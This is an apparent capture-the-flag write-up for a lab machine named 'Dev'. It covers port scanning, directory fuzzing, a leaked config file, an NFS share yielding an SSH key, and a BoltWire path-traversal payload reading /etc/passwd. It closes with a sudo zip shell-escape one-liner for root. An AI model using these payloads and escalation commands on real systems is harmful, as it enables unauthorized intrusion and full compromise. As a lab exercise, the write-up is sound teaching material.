# Dev Write-up

## Target Information

**Victim IP:** `192.168.88.134`

---

## 1. Nmap Scan

Ran an initial nmap scan on the target:

```bash
nmap -sC -sV 192.168.88.134
```

**Interesting Ports:**

| Port   | Service                    | Version                             |
| ------ | -------------------------- | ----------------------------------- |
| 22     | ssh                        | OpenSSH 7.9p1 Debian                |
| 80     | http                       | Apache httpd 2.4.38                 |
| 111    | rpcbind                    | RPC 2-4                             |
| 2049   | nfs                        | NFS 3-4                             |
| 8080   | http                       | Apache httpd 2.4.38 + PHP info page |
| Others | mountd, nlockmgr, nfs\_acl | via rpcinfo                         |

---

## 2. Web Enumeration

### Port 80:

* Page shows `Bolt - Installation error`
* Suggests Linux server and a broken BoltWire CMS installation.
<img width="1043" height="430" alt="image" src="https://github.com/user-attachments/assets/35a99b44-ce35-4553-92b6-d27383703753" />

### Port 8080:

* Exposes PHP info: `PHP 7.3.27-1~deb10u1`
<img width="1504" height="641" alt="image" src="https://github.com/user-attachments/assets/9bc8bd09-8171-46e1-b2c0-a8a3db60381b" />

### Fuzzing:

Used `ffuf` to fuzz both ports for hidden directories.

**Port 8080 results:**
<img width="1487" height="616" alt="image" src="https://github.com/user-attachments/assets/e09e6b88-4407-46ba-97af-02a397bf16c9" />

* `/dev`
<img width="1041" height="461" alt="image" src="https://github.com/user-attachments/assets/336c9b10-f5b9-42a5-86c9-21a3a15e12bc" />

**Port 80 results:**
<img width="1480" height="723" alt="image" src="https://github.com/user-attachments/assets/f1ba62b4-d0a2-4aec-add4-2a23db710f3e" />

* `/app`, `/config`, `/public`, `/src`, `/vendor`, `/extensions`

The `/app/config/config.yml` file was accessible and leaked username & password info.
<img width="1513" height="425" alt="image" src="https://github.com/user-attachments/assets/eae1963b-5a60-47d0-8e4b-4b291092dc74" />

---

## 3. NFS Enumeration

Ran:

```bash
showmount -e 192.168.88.134
```

Found:

<img width="589" height="104" alt="image" src="https://github.com/user-attachments/assets/0488bad1-1ea2-4256-8452-b0696b378281" />

Mounted it locally:

```bash
mkdir /mnt/dev
mount -t nfs 192.168.88.134:/srv/nfs /mnt/dev/
```

Inside: `save.zip` (password-protected)

Cracked it with `fcrackzip`:

<img width="848" height="177" alt="image" src="https://github.com/user-attachments/assets/b66eaba8-4348-4b63-9e8f-c741fa9e1c05" />

Extracted:

* `id_rsa` (SSH private key)
* `todo.txt` (Signed by "JP")
<img width="949" height="208" alt="image" src="https://github.com/user-attachments/assets/15523c26-0afd-4779-a1db-255d748c93e4" />

---

## 4. Exploiting BoltWire

Found an LFI vulnerability (CVE-2020-24186):

> [https://www.exploit-db.com/exploits/48411](https://www.exploit-db.com/exploits/48411)

Registered a BoltWire user and ran:

```
http://192.168.88.134:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
```

Successfully leaked `/etc/passwd`. Found user: `jeanpaul`
<img width="1054" height="832" alt="image" src="https://github.com/user-attachments/assets/2f0770b4-dc74-4332-ae4e-ca674c98cf41" />
<img width="1047" height="781" alt="image" src="https://github.com/user-attachments/assets/f94ad5bd-b690-456b-bf51-352497e2d9db" />

---

## 5. SSH Access

Tried to SSH with the cracked `id_rsa` and used the password from `config.yml`. Success!

<img width="893" height="390" alt="image" src="https://github.com/user-attachments/assets/427d2f56-a0cd-4d34-9e17-21eb5dac30de" />

---

## 6. Privilege Escalation

Ran `sudo -l`:

<img width="1036" height="119" alt="image" src="https://github.com/user-attachments/assets/74463d5f-3c80-4945-bd36-3cb8ad336b76" />

Used GTFOBins for zip privilege escalation (https://gtfobins.github.io/gtfobins/zip/#sudo):

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

Got root!
<img width="642" height="316" alt="image" src="https://github.com/user-attachments/assets/f30255df-29b1-441c-8357-6b9f2fe36ed2" />

---

## Summary

* Exploited misconfigured NFS to extract SSH key.
* Used leaked creds from BoltWire and config.yml.
* Escalated to root with GTFOBins zip trick.

**Rooted!** 🏴
